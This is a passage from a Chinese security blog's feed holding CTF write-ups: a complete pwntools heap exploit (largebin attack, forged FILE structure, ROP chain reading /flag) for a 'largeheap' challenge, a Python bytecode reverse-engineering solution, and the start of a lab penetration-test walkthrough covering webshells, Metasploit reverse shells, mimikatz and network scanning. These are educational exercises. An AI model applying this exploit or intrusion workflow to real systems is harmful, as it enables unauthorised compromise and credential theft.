_IO_UNBUFFERED))</span><br><span class="line">          <span class="comment">// #define _IO_LINE_BUF          0x0200</span></span><br><span class="line">          <span class="comment">// #define _IO_UNBUFFERED        0x0002</span></span><br><span class="line">	      f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>

<p>实际上我们最后还是会进入<code>_IO_do_write</code>，最后也是不出意外会来到<code>new_do_write</code>中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line"><span class="title function_">new_do_write</span> <span class="params">(FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, <span class="type">size_t</span> to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">      <span class="comment">// #define _IO_IS_APPENDING      0x1000</span></span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)			<span class="comment">// 需要绕过</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">off64_t</span> new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);		<span class="comment">// 目标</span></span><br></pre></td></tr></table></figure>

<p>可以发现只要满足以下条件就可以打印<code>_IO_write_base</code>到<code>_IO_write_ptr</code>之间的内容。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_IO_read_end == fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>

<p>此外还需要注意的一个点就是，当我们第一次改变IO结构体的时候，由于在随机数那个模块使用的是 printf 函数，所以会导致第二次无法输出凭证。但是我们发现，执行程序的速度很快，已经快过了一个时间戳，所以再次输入上次的凭证也可以登录。</p>
<p>还有一点就是找地址很烦，调了很久才出来。</p>
<p>这里我用满了分配的次数，其实是可以不需要那么多的，<strong>堆风水的布置也是一门学问</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./largeheap&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./largeheap&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./largeheap&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">key_global = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, buf</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size: &quot;</span>, <span class="built_in">str</span>(size))    <span class="comment"># 0x418 ~ 0x468</span></span><br><span class="line">    sa(<span class="string">&quot;content: &quot;</span>, buf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">time, <span class="built_in">type</span>, idx, buf = null, offset = null</span>):</span><br><span class="line">    <span class="keyword">global</span> key_global</span><br><span class="line">    sla(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> time == <span class="number">1</span>:</span><br><span class="line">        key = <span class="built_in">int</span>(ru(<span class="string">&quot;\nWe&quot;</span>)[:-<span class="number">3</span>], <span class="number">10</span>)</span><br><span class="line">        sla(<span class="string">&quot;identity!\n&quot;</span>, <span class="built_in">str</span>(key))</span><br><span class="line">        key_global = key</span><br><span class="line">    <span class="keyword">elif</span> time == <span class="number">2</span>:</span><br><span class="line">        sla(<span class="string">&quot;check your identity!\n&quot;</span>, <span class="built_in">str</span>(key_global))</span><br><span class="line">    </span><br><span class="line">    sla(<span class="string">&quot;type of edit: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:</span><br><span class="line">        sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">        sa(<span class="string">&quot;content: &quot;</span>, buf)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        sla(<span class="string">&quot;index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">        sa(<span class="string">&quot;enter offset: &quot;</span>, <span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>, offset = <span class="number">0xab1</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>, offset = <span class="number">0xac1</span>)</span><br><span class="line"></span><br><span class="line">libc_leak = []</span><br><span class="line">heap_leak = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    tmp = <span class="built_in">hex</span>(uu64())</span><br><span class="line">    libc_leak.append(tmp)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    tmp = <span class="built_in">hex</span>(u64(ru(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line">    heap_leak.append(tmp)</span><br><span class="line">sla(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"><span class="comment"># print(libc_leak)</span></span><br><span class="line"><span class="comment"># print(heap_leak)</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_leak[<span class="number">13</span>], <span class="number">16</span>) - <span class="number">0x21a580</span></span><br><span class="line">heap_base = <span class="built_in">int</span>(heap_leak[<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">setcontext_61 = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">p_rdx_r12_r = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_r = libc_base + <span class="number">0x0000000000091396</span></span><br><span class="line">lg(<span class="string">&#x27;setcontext_61&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x428</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x448</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># merge with top chunk        </span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x428</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># largebin</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x428</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)        <span class="comment"># change top chunk size</span></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x428</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">pld = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x428</span> + p64(<span class="number">0x1521</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, buf = pld)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x448</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">pld = p64(libc_base + <span class="number">0x21a0d0</span>) * <span class="number">2</span> + p64(heap_base + <span class="number">0x1350</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x438</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x28</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># _wide_data -&gt; _IO_read_end</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_read_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0xe0</span> + <span class="number">0x30</span> + <span class="number">0x20</span>)   <span class="comment"># _IO_write_ptr also new_rdx</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x30</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _mode = 0</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps + <span class="number">0x10</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xe0</span> + <span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0xe0</span> + <span class="number">0x30</span>)  <span class="comment"># new_rax</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file1 += p64(setcontext_61)</span><br><span class="line">fake_file1 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xa0</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x17b0</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_file1 += p64(p_rdi_r + <span class="number">1</span>)      <span class="comment"># rip -&gt; ret</span></span><br><span class="line"></span><br><span class="line">orw = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># close</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x18f0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># open -&gt; fd = 0</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># read</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># write</span></span><br><span class="line">orw += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x418</span>, fake_file1)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x448</span>, orw)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x438</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x28</span> + p64(<span class="number">0x233</span>))</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *&#x27; + hex(setcontext_61))</span></span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="easyRE"><a href="#easyRE" class="headerlink" title="easyRE"></a>easyRE</h3><blockquote>
<p><a href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re&#x2F;pyinstxtractor: PyInstaller Extractor (github.com)</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python .\pyinstxtractor.py .\easyRE.exe</span><br><span class="line">[+] Processing .\easyRE.exe</span><br><span class="line">[+] Pyinstaller version: 2.1+</span><br><span class="line">[+] Python version: 3.11</span><br><span class="line">[+] Length of package: 6323496 bytes</span><br><span class="line">[+] Found 61 files in CArchive</span><br><span class="line">[+] Beginning extraction...please standby</span><br><span class="line">[+] Possible entry point: pyiboot01_bootstrap.pyc</span><br><span class="line">[+] Possible entry point: pyi_rth_inspect.pyc</span><br><span class="line">[+] Possible entry point: easyRE.pyc</span><br><span class="line">[+] Found 102 files in PYZ archive</span><br><span class="line">[+] Successfully extracted pyinstaller archive: .\easyRE.exe</span><br><span class="line"></span><br><span class="line">You can now use a python decompiler on the pyc files within the extracted directory</span><br></pre></td></tr></table></figure>

<p>发现是 python3.11 的程序，由于目前 uncompyle 只支持到 python3.10，所以我们只能通过查看他的字节码来破解。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./easyRE.pyc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># python3 的 magic 是16位的</span></span><br><span class="line">    f.seek(<span class="number">16</span>)</span><br><span class="line">    dis.dis(marshal.load(f))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 0           0 RESUME                   0</span><br><span class="line"></span><br><span class="line"> 1           2 LOAD_CONST               0 (0)</span><br><span class="line">             4 LOAD_CONST               1 (None)</span><br><span class="line">             6 IMPORT_NAME              0 (random)</span><br><span class="line">             8 STORE_NAME               0 (random)</span><br><span class="line"></span><br><span class="line"> 3          10 PUSH_NULL</span><br><span class="line">            12 LOAD_NAME                0 (random)</span><br><span class="line">            14 LOAD_ATTR                1 (Random)</span><br><span class="line">            24 LOAD_CONST               2 (322376503)</span><br><span class="line">            26 PRECALL                  1</span><br><span class="line">            30 CALL                     1</span><br><span class="line">            40 STORE_NAME               2 (r)</span><br><span class="line"></span><br><span class="line"> 6          42 PUSH_NULL</span><br><span class="line">            44 LOAD_NAME                3 (input)</span><br><span class="line">            46 LOAD_CONST               3 (&#x27;Enter your flag: &#x27;)</span><br><span class="line">            48 PRECALL                  1</span><br><span class="line">            52 CALL                     1</span><br><span class="line">            62 LOAD_METHOD              4 (encode)</span><br><span class="line">            84 PRECALL                  0</span><br><span class="line">            88 CALL                     0</span><br><span class="line">            98 STORE_NAME               5 (pt)</span><br><span class="line"></span><br><span class="line"> 8         100 LOAD_CONST               4 (b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;)</span><br><span class="line">           102 STORE_NAME               6 (ct)</span><br><span class="line"></span><br><span class="line">10         104 BUILD_LIST               0</span><br><span class="line">           106 STORE_NAME               7 (buf)</span><br><span class="line"></span><br><span class="line">12         108 LOAD_NAME                5 (pt)</span><br><span class="line">           110 GET_ITER</span><br><span class="line">       &gt;&gt;  112 FOR_ITER                46 (to 206)</span><br><span class="line">           114 STORE_NAME               8 (b)</span><br><span class="line"></span><br><span class="line">13         116 LOAD_NAME                7 (buf)</span><br><span class="line">           118 LOAD_METHOD              9 (append)</span><br><span class="line">           140 LOAD_NAME                2 (r)</span><br><span class="line">           142 LOAD_METHOD             10 (randint)</span><br><span class="line">           164 LOAD_CONST               0 (0)</span><br><span class="line">           166 LOAD_CONST               5 (255)</span><br><span class="line">           168 PRECALL                  2</span><br><span class="line">           172 CALL                     2</span><br><span class="line">           182 LOAD_NAME                8 (b)</span><br><span class="line">           184 BINARY_OP               12 (^)</span><br><span class="line">           188 PRECALL                  1</span><br><span class="line">           192 CALL                     1</span><br><span class="line">           202 POP_TOP</span><br><span class="line">           204 JUMP_BACKWARD           47 (to 112)</span><br><span class="line"></span><br><span class="line">15     &gt;&gt;  206 PUSH_NULL</span><br><span class="line">           208 LOAD_NAME               11 (bytes)</span><br><span class="line">           210 LOAD_NAME                7 (buf)</span><br><span class="line">           212 PRECALL                  1</span><br><span class="line">           216 CALL                     1</span><br><span class="line">           226 LOAD_NAME                6 (ct)</span><br><span class="line">           228 COMPARE_OP               2 (==)</span><br><span class="line">           234 POP_JUMP_FORWARD_IF_TRUE     2 (to 240)</span><br><span class="line">           236 LOAD_ASSERTION_ERROR</span><br><span class="line">           238 RAISE_VARARGS            1</span><br><span class="line"></span><br><span class="line">17     &gt;&gt;  240 PUSH_NULL</span><br><span class="line">           242 LOAD_NAME               12 (print)</span><br><span class="line">           244 LOAD_CONST               6 (&#x27;Correct!&#x27;)</span><br><span class="line">           246 PRECALL                  1</span><br><span class="line">           250 CALL                     1</span><br><span class="line">           260 POP_TOP</span><br><span class="line">           262 LOAD_CONST               1 (None)</span><br><span class="line">           264 RETURN_VALUE</span><br></pre></td></tr></table></figure>

<p>通过查看字节码，我们反编译到：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">r = random.Random(<span class="number">322376503</span>)</span><br><span class="line">pt = <span class="built_in">input</span>(<span class="string">&#x27;Enter your flag: &#x27;</span>).encode()</span><br><span class="line">ct = <span class="string">b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6 \</span></span><br><span class="line"><span class="string">QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span></span><br><span class="line">buf = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> pt:</span><br><span class="line">    buf.append(r.randint(<span class="number">0</span>, <span class="number">255</span>) ^ b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">bytes</span>(buf) == ct</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Correct!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>解密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">r = random.Random(<span class="number">322376503</span>)</span><br><span class="line">ct = <span class="string">b&#x27;\x8b\xcck\xd3\xed\x96\xffFb\x06r\x085\x82\xbc \xb2\xde)p\x88Q`\x1bf\x18\xb6&#x27;</span> \</span><br><span class="line"><span class="string">b&#x27;QUSw\x10\xcd\xd9\x13A$\x86\xe5\xcd\xd9\xff&#x27;</span></span><br><span class="line">buf = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> ct:</span><br><span class="line">    buf += <span class="built_in">chr</span>(r.randint(<span class="number">0</span>, <span class="number">255</span>) ^ b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(buf)</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>DASCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>初探多重网段的渗透</title>
    <url>/2023/05/14/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%9B%9B/</url>
    <content><![CDATA[<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本次学习的是暗月项目四：初探多重网段的渗透。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513171429668.png" alt="image-20230513171429668"></p>
<p>网站测试：</p>
<ul>
<li>new.cc123.com：学习了 dedecms 漏洞的利用；尝试了利用 aspxspy.aspx 木马进行权限的提升，利用 msf 中的 multi&#x2F;handler 攻击模块进行 shell 的反弹；最后利用 msf  中的漏洞寻找模块 multi&#x2F;recon&#x2F;local_exploit_suggester 提升权限至系统权限。</li>
<li>ww2.cc123.com：学习了后台登录的一个 sql 注入漏洞；利用 sqlmap 侦测到数据库用户为超级用户，拿到了数据库的 shell；除此以外还测试了 kindeditor 的文件上传漏洞。</li>
</ul>
<p>内网渗透：</p>
<p>学习了利用 metasploit 中的 mimikatz 来收集用户凭证；反向和正向连接远程服务器；利用 auxiliary&#x2F;server&#x2F;socks_proxy 和 proxychains 进行代理；利用 SocksCap64 使得主机也可以访问到内网。</p>
<p>最终也是跟着暗月佬的视频拿下了三台主机，虽然路途坎坷。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230514211225141.png" alt="image-20230514211225141"></p>
<span id="more"></span>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主机发现</span></span><br><span class="line">sudo arp-scan -l</span><br><span class="line">sudo netdiscover -r 192.168.0.0/24</span><br><span class="line">nmap -sn 192.168.0.0/24</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">端口扫描</span></span><br><span class="line">sudo masscan -p 1-65535 192.168.0.134 --rate=10000		# 快速扫描</span><br><span class="line">nmap -sC -A 192.168.0.134 -p 80,53,49154,6588,3389,135,21,51464,999 -oA nmap_rs</span><br></pre></td></tr></table></figure>

<p><strong>发现存在 dns 服务器</strong>，在 Kali 中修改设置 dns 服务器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/resolv.conf</span><br><span class="line">nameserver 192.168.0.134		# add</span><br><span class="line"></span><br><span class="line">chattr +i /etc/resolv.conf		# lock</span><br><span class="line">chattr -i /etc/resolv.conf		# unlock</span><br></pre></td></tr></table></figure>

<p>利用 wfuzz 进行子域名的收集</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wfuzz -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt -u cc123.com -H &quot;Host:FUZZ.cc123.com&quot; --hw 53 --hl 6</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230512202437530.png" alt="image-20230512202437530"></p>
<h2 id="网站测试"><a href="#网站测试" class="headerlink" title="网站测试"></a>网站测试</h2><h3 id="new-cc123-com"><a href="#new-cc123-com" class="headerlink" title="new.cc123.com"></a>new.cc123.com</h3><p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513085641450.png" alt="image-20230513085641450"></p>
<p>根据织梦的特点找到版本号。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230513090301309.png" alt="image-20230513090301309"></p>
<blockquote>
<p><a href="http://www.hekaiyu.cn/hacker/3060.html">Dedecms 20150618 注入漏洞(可注入管理员账户) - 开水网络 (hekaiyu.cn)</a></p>
</blockquote>
